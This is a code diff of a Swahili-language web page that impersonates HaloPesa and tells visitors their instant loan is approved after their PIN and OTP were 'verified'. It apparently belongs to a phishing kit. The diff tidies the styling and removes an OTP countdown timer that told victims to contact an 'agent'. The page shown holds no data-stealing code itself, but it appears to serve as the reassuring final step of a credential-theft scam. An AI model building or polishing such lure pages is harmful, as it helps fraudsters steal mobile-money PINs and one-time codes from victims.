@@ -35,183 +35,36 @@
         .header-sub { font-size:1rem; color:#fff; opacity:0.95; text-align:center; margin-bottom:18px; }
         .card { background:var(--white); border-radius:20px; padding:20px 16px; margin-bottom:15px; box-shadow:0 4px 12px rgba(0,0,0,0.08); }
         .card-title { font-size:1.1rem; font-weight:800; color:var(--dark); margin-bottom:12px; text-align:center; }
-        
-        /* Success tick */
-        .success-icon {
-            text-align: center;
-            margin: 5px 0 10px;
-        }
-        .success-icon .checkmark {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            display: block;
-            margin: 0 auto;
-            stroke-width: 3;
-            stroke: var(--green);
-            stroke-miterlimit: 10;
-            animation: scale 0.3s ease-in-out 0.2s both;
-        }
-        .success-icon .checkmark__circle {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            stroke-width: 3;
-            stroke-miterlimit: 10;
-            stroke: var(--green);
-            fill: var(--green-bg);
-            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
-        }
-        .success-icon .checkmark__check {
-            transform-origin: 50% 50%;
-            stroke-dasharray: 48;
-            stroke-dashoffset: 48;
-            animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.4s forwards;
-        }
-        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
-        @keyframes scale {
-            0%, 100% { transform: none; }
-            50% { transform: scale3d(1.1, 1.1, 1); }
-        }
-
-        .success-title {
-            font-size: 1.4rem;
-            font-weight: 900;
-            color: var(--green);
-            text-align: center;
-            margin: 5px 0;
-        }
-        .success-subtitle {
-            text-align: center;
-            color: var(--gray);
-            font-size: 0.85rem;
-            margin-bottom: 5px;
-        }
-        .reference-box {
-            background: var(--light-gray);
-            border-radius: 10px;
-            padding: 8px 12px;
-            text-align: center;
-            margin: 8px 0;
-        }
+        .success-icon { text-align:center; margin:5px 0 10px; }
+        .success-icon .checkmark { width:70px; height:70px; border-radius:50%; display:block; margin:0 auto; stroke-width:3; stroke:var(--green); stroke-miterlimit:10; animation:scale 0.3s ease-in-out 0.2s both; }
+        .success-icon .checkmark__circle { stroke-dasharray:166; stroke-dashoffset:166; stroke-width:3; stroke-miterlimit:10; stroke:var(--green); fill:var(--green-bg); animation:stroke 0.6s cubic-bezier(0.65,0,0.45,1) forwards; }
+        .success-icon .checkmark__check { transform-origin:50% 50%; stroke-dasharray:48; stroke-dashoffset:48; animation:stroke 0.4s cubic-bezier(0.65,0,0.45,1) 0.4s forwards; }
+        @keyframes stroke { 100% { stroke-dashoffset:0; } }
+        @keyframes scale { 0%,100%{transform:none;} 50%{transform:scale3d(1.1,1.1,1);} }
+        .success-title { font-size:1.4rem; font-weight:900; color:var(--green); text-align:center; margin:5px 0; }
+        .success-subtitle { text-align:center; color:var(--gray); font-size:0.85rem; margin-bottom:5px; }
+        .reference-box { background:var(--light-gray); border-radius:10px; padding:8px 12px; text-align:center; margin:8px 0; }
         .reference-box .label { font-size:0.7rem; color:var(--gray); font-weight:600; }
         .reference-box .value { font-size:1rem; font-weight:800; color:var(--hp-orange); }
-
-        /* Loan summary grid */
-        .loan-summary {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 8px 0;
-        }
-        .summary-item {
-            background: var(--light-gray);
-            border-radius: 10px;
-            padding: 10px 12px;
-            text-align: center;
-        }
+        .loan-summary { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin:8px 0; }
+        .summary-item { background:var(--light-gray); border-radius:10px; padding:10px 12px; text-align:center; }
         .summary-item .label { font-size:0.7rem; color:var(--gray); font-weight:600; text-transform:uppercase; }
         .summary-item .value { font-size:1rem; font-weight:800; color:var(--dark); margin-top:2px; }
         .summary-item .value.orange { color:var(--hp-orange); }
-
-        /* Status tracker */
-        .status-list {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            margin: 8px 0;
-        }
-        .status-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px 12px;
-            border-radius: 10px;
-            background: var(--light-gray);
-            font-size: 0.85rem;
-            font-weight: 500;
-            color: var(--gray);
-        }
-        .status-item.completed {
-            background: var(--green-bg);
-            color: var(--green);
-        }
-        .status-item.active {
-            background: var(--blue-bg);
-            color: var(--blue);
-        }
-        .status-item .icon {
-            font-size: 1.2rem;
-            width: 24px;
-            text-align: center;
-        }
-        .status-item .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid var(--blue-bg);
-            border-top: 3px solid var(--blue);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
+        .status-list { display:flex; flex-direction:column; gap:6px; margin:8px 0; }
+        .status-item { display:flex; align-items:center; gap:10px; padding:8px 12px; border-radius:10px; background:var(--light-gray); font-size:0.85rem; font-weight:500; color:var(--gray); }
+        .status-item.completed { background:var(--green-bg); color:var(--green); }
+        .status-item.active { background:var(--blue-bg); color:var(--blue); }
+        .status-item .icon { font-size:1.2rem; width:24px; text-align:center; }
+        .status-item .spinner { display:inline-block; width:18px; height:18px; border:3px solid var(--blue-bg); border-top:3px solid var(--blue); border-radius:50%; animation:spin 0.8s linear infinite; }
         @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
-
-        /* SMS info box */
-        .sms-box {
-            background: #fef3c7;
-            border-radius: 12px;
-            padding: 14px 16px;
-            border-left: 4px solid #f59e0b;
-            margin: 8px 0;
-        }
-        .sms-box .icon { font-size: 1.2rem; }
-        .sms-box .text { font-size: 0.85rem; color: #92400e; font-weight:500; }
-
-        /* Timer */
-        .timer-box {
-            background: #fef2f2;
-            border-radius: 10px;
-            padding: 8px 12px;
-            text-align: center;
-            margin: 8px 0;
-            border: 2px solid #fca5a5;
-        }
-        .timer-box .time {
-            font-size: 1.6rem;
-            font-weight: 900;
-            color: #dc2626;
-        }
-        .timer-box .label { font-size:0.7rem; color:var(--gray); }
-
-        /* Button */
-        .btn-home {
-            display: inline-block;
-            background: var(--hp-orange);
-            color: #fff;
-            font-weight: 700;
-            font-size: 1rem;
-            padding: 14px 0;
-            border: none;
-            border-radius: 50px;
-            width: 100%;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            text-decoration: none;
-        }
+        .sms-box { background:#fef3c7; border-radius:12px; padding:14px 16px; border-left:4px solid #f59e0b; margin:8px 0; }
+        .sms-box .icon { font-size:1.2rem; }
+        .sms-box .text { font-size:0.85rem; color:#92400e; font-weight:500; }
+        .btn-home { display:inline-block; background:var(--hp-orange); color:#fff; font-weight:700; font-size:1rem; padding:14px 0; border:none; border-radius:50px; width:100%; cursor:pointer; transition:0.2s; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center; text-decoration:none; }
         .btn-home:hover { background:var(--hp-dark); transform:translateY(-1px); }
-
-        .footer-features {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            font-size: 0.7rem;
-            color: #fff;
-            opacity: 0.9;
-            padding: 10px 0;
-        }
+        .footer-features { display:flex; justify-content:center; gap:20px; font-size:0.7rem; color:#fff; opacity:0.9; padding:10px 0; }
         .footer-features span { display:flex; align-items:center; gap:4px; }
-
         @media (max-width:480px) {
             .container { padding:5px 0; }
             .card { padding:16px 12px; }
@@ -225,7 +78,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Logo -->
         <div class="logo">
             <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                 <rect width="100" height="100" rx="22" fill="#FF5A1F"/>
@@ -236,9 +88,7 @@
         <div class="brand-name">HaloPesa</div>
         <div class="header-sub">Ombi Limekubaliwa</div>
 
-        <!-- Success Card -->
         <div class="card">
-            <!-- Success Icon -->
             <div class="success-icon">
                 <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                     <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
@@ -247,61 +97,32 @@
             </div>
             <div class="success-title">Ombi Limekubaliwa!</div>
             <div class="success-subtitle">Mkopo wako umeidhinishwa rasmi</div>
-
-            <!-- Reference Number -->
             <div class="reference-box">
                 <div class="label">Nambari ya Kumbukumbu</div>
                 <div class="value" id="referenceNumber">HP-XXXXXXXX</div>
             </div>
         </div>
 
-        <!-- Loan Summary Card -->
         <div class="card">
             <div class="card-title">📊 Muhtasari wa Mkopo</div>
             <div class="loan-summary">
-                <div class="summary-item">
-                    <div class="label">Kiasi cha Mkopo</div>
-                    <div class="value orange" id="summaryAmount">TZS 1,000,000</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Muda wa Mkopo</div>
-                    <div class="value" id="summaryTerm">3 Mwezi</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Malipo Kila Mwezi</div>
-                    <div class="value orange" id="summaryMonthly">TZS 336,115</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Kiwango cha Riba</div>
-                    <div class="value">5%</div>
-                </div>
+                <div class="summary-item"><div class="label">Kiasi cha Mkopo</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
+                <div class="summary-item"><div class="label">Muda wa Mkopo</div><div class="value" id="summaryTerm">3 Mwezi</div></div>
+                <div class="summary-item"><div class="label">Malipo Kila Mwezi</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
+                <div class="summary-item"><div class="label">Kiwango cha Riba</div><div class="value">5%</div></div>
             </div>
         </div>
 
-        <!-- Status Tracker Card -->
         <div class="card">
             <div class="card-title">📋 Hali ya Maombi</div>
             <div class="status-list">
-                <div class="status-item completed" id="step1">
-                    <span class="icon">✅</span>
-                    <span>Maombi yamewasilishwa</span>
-                </div>
-                <div class="status-item completed" id="step2">
-                    <span class="icon">✅</span>
-                    <span>PIN imethibitishwa</span>
-                </div>
-                <div class="status-item completed" id="step3">
-                    <span class="icon">✅</span>
-                    <span>OTP imethibitishwa</span>
-                </div>
-                <div class="status-item active" id="step4">
-                    <span class="icon"><span class="spinner"></span></span>
-                    <span>Uchakataji wa fedha unaendelea...</span>
-                </div>
+                <div class="status-item completed"><span class="icon">✅</span><span>Maombi yamewasilishwa</span></div>
+                <div class="status-item completed"><span class="icon">✅</span><span>PIN imethibitishwa</span></div>
+                <div class="status-item completed"><span class="icon">✅</span><span>OTP imethibitishwa</span></div>
+                <div class="status-item active"><span class="icon"><span class="spinner"></span></span><span>Uchakataji wa fedha unaendelea...</span></div>
             </div>
         </div>
 
-        <!-- SMS Info Card -->
         <div class="card">
             <div class="sms-box">
                 <div style="display:flex; align-items:center; gap:10px;">
@@ -311,81 +132,32 @@
             </div>
         </div>
 
-        <!-- Home Button -->
         <a href="/" class="btn-home">🏠 Rudi Nyumbani</a>
 
-        <!-- Footer -->
         <div class="footer-features">
             <span>🔒 Salama kwa Njia Fiche</span>
             <span>⚡ Idhini ya Dakika 5</span>
             <span>💰 Hakuna Ada Zilizofichwa</span>
         </div>
     </div>
-
     <script>
-        // ----- Get data from URL -----
         const params = new URLSearchParams(window.location.search);
         const appId = params.get('app_id') || 'HP-' + Math.random().toString(36).substring(2, 10).toUpperCase();
         const amount = parseInt(params.get('amount')) || 1000000;
         const months = parseInt(params.get('months')) || 3;
         const phone = params.get('phone') || '---';
 
-        // Calculate monthly payment
         const APR = 0.05;
         const monthlyRate = APR / 12;
         let monthlyPayment = 0;
-        if (monthlyRate === 0) {
-            monthlyPayment = amount / months;
-        } else {
-            monthlyPayment = amount * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
-        }
+        if (monthlyRate === 0) { monthlyPayment = amount / months; } 
+        else { monthlyPayment = amount * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1); }
 
-        function formatCurrency(num) {
-            return 'TZS ' + Math.round(num).toLocaleString('en-US');
-        }
-
-        // Populate summary
+        function formatCurrency(num) { return 'TZS ' + Math.round(num).toLocaleString('en-US'); }
         document.getElementById('referenceNumber').textContent = appId;
         document.getElementById('summaryAmount').textContent = formatCurrency(amount);
         document.getElementById('summaryTerm').textContent = months + ' Mwezi';
         document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
-
-        // ----- 2-Minute Countdown Timer -----
-        let timeLeft = 120; // 2 minutes in seconds
-        const timerDisplay = document.createElement('div');
-        timerDisplay.className = 'timer-box';
-        timerDisplay.innerHTML = `
-            <div class="label">⏱ Muda uliobaki wa kuthibitisha OTP</div>
-            <div class="time" id="timer">02:00</div>
-        `;
-
-        // Insert timer after the status list
-        const statusList = document.querySelector('.status-list');
-        statusList.parentNode.insertBefore(timerDisplay, statusList.nextSibling);
-
-        const timerElement = document.getElementById('timer');
-
-        function updateTimer() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-
-            if (timeLeft === 0) {
-                timerElement.style.color = '#dc2626';
-                timerElement.textContent = '⏰ Muda Umeisha!';
-                // Optionally redirect or show message
-                document.querySelector('.timer-box .label').textContent = '⏰ Muda wa kuthibitisha OTP umeisha. Wasiliana na mhudumu.';
-                clearInterval(timerInterval);
-            }
-            timeLeft--;
-        }
-
-        const timerInterval = setInterval(updateTimer, 1000);
-
-        // Clean up timer if page is unloaded
-        window.addEventListener('beforeunload', function() {
-            clearInterval(timerInterval);
-        });
     </script>
 </body>
 </html>
